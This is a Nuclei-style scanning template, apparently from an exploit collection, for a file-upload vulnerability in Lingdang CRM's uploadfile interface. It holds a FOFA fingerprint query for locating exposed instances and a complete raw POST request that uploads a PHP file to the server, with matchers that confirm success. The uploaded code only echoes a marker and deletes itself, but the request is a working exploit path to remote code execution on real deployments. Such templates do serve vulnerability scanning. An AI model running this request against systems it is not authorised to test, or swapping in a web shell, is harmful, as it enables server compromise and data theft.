id: lingdang-crm-uploadfile-upload

info:
  name: "灵当CRM系统uploadfile接口文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
      灵当CRM系统uploadfile接口存在文件上传安全缺陷，攻击者可通过该接口上传恶意文件至服务器，从而实现远程代码执行、网页内容篡改或其他恶意操作，对系统完整性及数据机密性构成严重威胁。
  tags: 灵当CRM

http:
- raw:
  - |
    POST /crm/weixinmp/index.php?userid=123&module=Upload&usid=1&action=uploadfile HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Content-Type: application/x-www-form-urlencoded
    Connection: close

    file_info={"name":"NTest.php"}&<?php echo 'NdayTest'; unlink(__FILE__); ?>
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'newfile_name'
